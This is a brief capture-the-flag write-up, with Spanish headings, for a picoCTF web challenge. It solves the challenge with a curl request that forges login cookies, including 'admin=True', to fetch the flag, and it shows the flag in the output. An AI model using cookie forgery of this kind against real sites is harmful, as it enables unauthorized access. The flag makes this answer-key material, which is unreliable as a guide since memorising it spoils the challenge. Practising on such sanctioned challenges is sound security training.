## Objetivo
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or [http://jupiter.challenges.picoctf.org:44573](http://jupiter.challenges.picoctf.org:44573/)
## Solución
```
curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H  'Cookie: password=12345; username=Pepe; admin=True' | grep picoCTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:-- 100  1312  100  1312    0     0   4774      0 --:--:-- --:--:-- --:--:--  4770
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc
```
## Notas adicionales
[https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods]
## Referencias